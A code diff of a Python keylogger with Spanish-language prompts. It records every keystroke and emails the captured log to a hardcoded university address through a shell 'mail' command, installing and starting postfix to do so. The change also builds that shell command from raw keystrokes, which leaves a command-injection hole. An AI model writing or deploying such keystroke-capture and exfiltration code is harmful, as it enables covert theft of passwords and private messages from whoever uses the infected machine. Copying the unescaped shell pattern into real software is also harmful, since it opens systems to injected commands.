@@ -1,21 +1,27 @@
 import keyboard
-import smtplib
-import yagmail
+import subprocess
 
 registros = []
 
 def callback(event):
-    #print(event.name) 
-    registros.append(event.name) 
+    registros.append(event.name)
 
 def output(text):
     with open('output.txt', 'a') as f:
         f.write(text)
 
-def send_email(sender_email , receiver_email, mensaje):
-  
-    yag = yagmail.SMTP(sender_email)
-    yag.send(to=receiver_email, subject='Registros de Keylogger', contents=mensaje)
+def send_email(sender_email, receiver_email, mensaje):
+    command = f"echo '{mensaje}' | mail -s 'Registros de Keylogger' -r {sender_email} {receiver_email}"
+    subprocess.run(command, shell=True)
+
+def install_postfix():
+    subprocess.run(["apt", "install", "postfix", "-y"])
+
+def start_postfix():
+    subprocess.run(["systemctl", "start", "postfix"])
+
+def stop_postfix():
+    subprocess.run(["systemctl", "stop", "postfix"])
 
 def main():
     print("---------------------------------")
@@ -26,8 +32,8 @@ def main():
     respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
         
     if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
-    	print("Interrumpiendo la ejecución del programa...")
-    	return
+        print("Interrumpiendo la ejecución del programa...")
+        return
     
     keyboard.on_release(callback)
     
@@ -43,12 +49,19 @@ def main():
     print(registro)
     
     if respuesta_email.lower() in ['yes', 'y']:
-        send_email("Paola_VB@ciencias.unam.mx", "janet1204@ciencias.unam.mx" , registro)
-        send_email("janet1204@ciencias.unam.mx", "janet1204@ciencias.unam.mx" , registro)
+        sender_email = "janet1204@ciencias.unam.mx"
+        receiver_email = "Paola_VB@ciencias.unam.mx"
+        
+        install_postfix()
+        start_postfix()
+        
+        send_email(sender_email, receiver_email, registro)
+        
+        stop_postfix()
         
     if respuesta_guardar.lower() in ['yes', 'y']:
-    	output(registro)
-
+        output(registro)
 
 if __name__ == "__main__":
     main()
+
